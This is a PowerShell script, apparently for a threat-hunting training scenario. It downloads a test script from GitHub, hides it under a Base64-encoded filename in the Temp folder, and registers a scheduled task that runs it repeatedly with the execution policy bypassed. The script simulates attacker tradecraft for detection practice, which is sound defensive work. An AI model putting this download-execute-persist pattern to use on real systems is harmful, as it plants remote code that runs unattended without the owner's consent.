
# Define URLs and Paths
$downloadUrl = "https://github.com/mervintab/threat-hunting-scenarios/blob/main/assets/malicious-countdown-test.ps1"
$downloadsPath = "$env:USERPROFILE\Downloads"
$tempPath = "$env:TEMP"
$originalFile = Join-Path $downloadsPath "malicious-countdown-test.ps1"

# Step 2: Download the installer (overwrite if exists)
Invoke-WebRequest -Uri $downloadUrl -OutFile $originalFile -UseBasicParsing -ErrorAction Stop

# Step 3: Encode filename in Base64 and change extension to .ps1
$base64Name = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("malicious-countdown-test.ps1")) + ".ps1"
$base64File = Join-Path $downloadsPath $base64Name
if (Test-Path $base64File) { Remove-Item $base64File -Force }
Rename-Item -Path $originalFile -NewName $base64Name

# Step 4: Move file to Temp folder (overwrite if exists)
$destFileInTemp = Join-Path $tempPath $base64Name
if (Test-Path $destFileInTemp) { Remove-Item $destFileInTemp -Force }
Move-Item -Path $base64File -Destination $tempPath

# Step 5: Install (overwrite if exists)
$installedFile = Join-Path $tempPath "malicious-countdown-test.ps1"
if (Test-Path $installedFile) { Remove-Item $installedFile -Force }
Copy-Item -Path $destFileInTemp -Destination $installedFile

# NEW Step: Schedule to run the obfuscated PowerShell file every 5 minutes, for 3 cycles (15 min)
$taskScript = "$env:TEMP\countdown_wrapper.bat"
Set-Content -Path $taskScript -Value "@echo off`nstart powershell.exe -ExecutionPolicy Bypass -File `"$destFileInTemp`"`nexit"

$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $taskScript"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
    -RepetitionInterval (New-TimeSpan -Minutes 5) `
    -RepetitionDuration (New-TimeSpan -Minutes 15)

Register-ScheduledTask -TaskName "MaliciousCountdownObfuscated" `
    -Action $action `
    -Trigger $trigger `
    -Description "Run obfuscated countdown script every 5 minutes for 3 times" `
    -Force

